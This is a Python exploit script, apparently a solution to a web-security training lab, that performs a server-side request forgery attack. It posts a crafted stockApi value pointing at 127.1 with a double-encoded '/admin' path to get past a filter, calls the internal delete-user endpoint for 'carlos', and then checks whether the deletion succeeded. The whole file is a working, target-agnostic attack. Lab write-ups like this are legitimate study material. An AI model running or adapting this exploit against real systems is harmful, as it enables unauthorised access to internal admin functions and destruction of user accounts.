#!/usr/bin/python3
import sys
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def delete_carlos(url):
    # The vulnerable function path
    vulnerable_endpoint = '/product/stock'
    # Craft payload
    payload = 'http://127.1/%2561dmin/delete?username=carlos'
    # Request parameter
    sending_data = {'stockApi': payload}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    # Debug info
    print("[*] Sending request to:", url + vulnerable_endpoint)
    print("[*] Payload:", sending_data)

    # Sending the request with data
    sending_request = requests.post(url + vulnerable_endpoint, data=sending_data, headers=headers, verify=False,
                                    proxies=proxies)
    # Checking the response status
    print("[*] Response status code:", sending_request.status_code)
    print("[*] Response text:", sending_request.text)

    if sending_request.status_code != 200:
        print("[-] Error: Received status code", sending_request.status_code)
        return

    # Visit the admin URL to check if the user was deleted
    admin_url = 'http://127.1/%2561dmin'
    check_payload = {'stockApi': admin_url}
    check_request = requests.post(url + vulnerable_endpoint, data=check_payload, headers=headers, verify=False,
                                  proxies=proxies)

    # Check if the response contains the text "User deleted successfully"
    if 'User deleted successfully' in check_request.text:
        print('[+] Carlos deleted successfully')
    else:
        print("[-] Unexpected error occurred or user not deleted")


def exploit():
    if len(sys.argv) != 2:
        print("[-] Error: Invalid number of arguments")
        print("[*] Usage of the script is: {} <target_url>".format(sys.argv[0]))
        exit(-1)

    url = sys.argv[1]
    if not url.startswith('http://') and not url.startswith('https://'):
        print("[-] Error: URL should start with 'http://' or 'https://'")
        exit(-1)

    delete_carlos(url)


if __name__ == "__main__":
    exploit()
